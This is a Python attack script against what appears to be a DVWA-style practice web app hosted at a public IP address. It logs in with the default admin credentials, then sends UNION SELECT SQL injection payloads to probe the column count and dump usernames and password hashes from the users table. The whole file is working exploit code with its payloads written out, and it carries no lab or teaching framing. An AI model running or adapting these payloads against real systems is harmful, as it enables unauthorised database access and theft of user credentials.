
import requests
import re

base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"
sqli_url = f"{base_url}/vulnerabilities/sqli/"

# First authenticate
session = requests.Session()
response = session.get(login_url)
token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)

if token_match:
    user_token = token_match.group(1)
    
    # Login
    data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    
    session.post(login_url, data=data)
    
    print("[*] Testing to find correct number of columns for UNION SELECT...\n")
    
    # The original query seems to be: SELECT id, first_name, last_name FROM users WHERE id = ?
    # Let's verify by testing different column counts
    
    payloads = [
        ("1' UNION SELECT 1,2,3--", "3 columns"),
        ("1' UNION SELECT 1,2,3,4--", "4 columns"),
        ("1' UNION SELECT 1,2,3,4,5--", "5 columns"),
    ]
    
    for payload, desc in payloads:
        print(f"\n[*] Testing: {desc} - {payload}")
        params = {"id": payload, "Submit": "Submit"}
        response = session.get(sqli_url, params=params, timeout=10)
        
        # Check for error
        if "different number of columns" in response.text:
            print(f"[-] Wrong column count: {response.text[response.text.find('different'):response.text.find('different')+100]}")
        elif "First name:" in response.text:
            pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
            if pre_match:
                content = pre_match.group(1)
                print(f"[+] Success! Response:\n{content}")
                break
    
    print("\n\n[*] Now extracting password hashes with correct column count...")
    
    # Once we find the correct count, extract data
    # Based on the structure, let's try to extract the password column
    union_payloads = [
        ("1' UNION SELECT user_id, user, password FROM users--", "Get usernames and passwords"),
        ("1' UNION SELECT user_id, CONCAT(user,'|',password), password FROM users--", "Concatenated format"),
        ("1' UNION SELECT user_id, user, password FROM users WHERE 1=1--", "With WHERE clause"),
    ]
    
    for payload, desc in union_payloads:
        print(f"\n[*] Testing: {desc}")
        print(f"[*] Payload: {payload}")
        params = {"id": payload, "Submit": "Submit"}
        response = session.get(sqli_url, params=params, timeout=10)
        
        # Check response
        if "different number of columns" in response.text:
            print(f"[-] Column count mismatch")
            # Extract the error
            if "SELECT statements have a different number of columns" in response.text:
                print(f"[!] Error suggests query format is wrong")
        else:
            pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
            if pre_match:
                content = pre_match.group(1)
                print(f"[+] Response:\n{content[:500]}")

